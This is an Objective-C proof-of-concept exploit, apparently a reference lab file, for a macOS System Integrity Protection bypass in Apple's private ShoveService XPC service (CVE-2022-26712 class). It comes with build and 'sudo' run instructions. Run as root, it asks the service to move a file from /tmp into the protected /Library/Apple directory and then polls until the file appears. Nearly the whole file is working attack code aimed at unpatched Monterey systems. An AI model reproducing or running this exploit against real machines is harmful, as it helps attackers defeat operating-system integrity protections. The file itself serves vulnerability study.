/*
 * Reference POC — SystemShoveService / PackageKit (CVE-2022-26712 class).
 * Requires Monterey (or matching VM) before Apple’s fix; run compiled binary as root.
 *
 * Build (paths vary by Xcode SDK — adjust PackageKit.tbd):
 *   gcc -fobjc-arc -framework Foundation \
 *     "$(xcrun --show-sdk-path)/System/Library/PrivateFrameworks/PackageKit.framework/PackageKit.tbd" \
 *     04_shovexpc.m -o 04_shovexpc
 *
 * Run: sudo ./04_shovexpc
 */

#import <Foundation/Foundation.h>

@interface PKShoveOptions : NSObject {
	NSURL *_sourcePath;
	NSURL *_destPath;
	unsigned long long _optionFlags;
}
@property(retain) NSURL *sourcePath;
@property(retain) NSURL *destPath;
@property unsigned long long optionFlags;
+ (char)supportsSecureCoding;
- (void)dealloc;
- (void)encodeWithCoder:(id)v1;
- (id)initWithCoder:(id)v1;
@end

@protocol SVShoveServiceProtocol
- (void)shoveWithOptions:(PKShoveOptions *)arg1
         completionHandler:(void (^)(BOOL, int))arg2;
@end

int main(void)
{
	@autoreleasepool {
		NSString *source = @"/private/tmp/sipbypass.txt";
		NSString *destination = @"/Library/Apple/sipbypass.txt";

		NSLog(@"[i] creating source file");
		[@"sample" writeToFile:source atomically:NO encoding:NSASCIIStringEncoding error:nil];

		NSLog(@"[i] loading ShoveService framework");
		[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/ShoveService.framework/"]
		    load];

		NSLog(@"[i] connecting to XPC service");
		NSXPCConnection *connection = [[NSXPCConnection alloc]
		    initWithServiceName:@"com.apple.installandsetup.ShoveService.System"];

		NSXPCInterface *interface =
		    [NSXPCInterface interfaceWithProtocol:@protocol(SVShoveServiceProtocol)];
		[connection setRemoteObjectInterface:interface];
		[connection resume];

		id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError *error) {
			NSLog(@"[-] something went wrong");
			NSLog(@"[-] error: %@", error);
		}];

		NSLog(@"[i] obj: %@", obj);
		NSLog(@"[i] conn: %@", connection);

		PKShoveOptions *options = [[PKShoveOptions alloc] init];
		/* Original material used URLWithString: with file paths — fileURLWithPath is clearer */
		[options setSourcePath:[NSURL fileURLWithPath:source]];
		[options setDestPath:[NSURL fileURLWithPath:destination]];

		NSLog(@"[i] calling XPC service method");
		[obj shoveWithOptions:options
		    completionHandler:^(BOOL b, int c) {
			    NSLog(@"[i] Response: %d, %d", b, c);
		    }];

		NSLog(@"[i] checking if file has been moved");
		for (;;) {
			NSFileManager *fileManager = [NSFileManager defaultManager];
			if ([fileManager fileExistsAtPath:destination]) {
				break;
			}
			[NSThread sleepForTimeInterval:1.0f];
		}

		NSLog(@"[+] Done");
	}
	return 0;
}
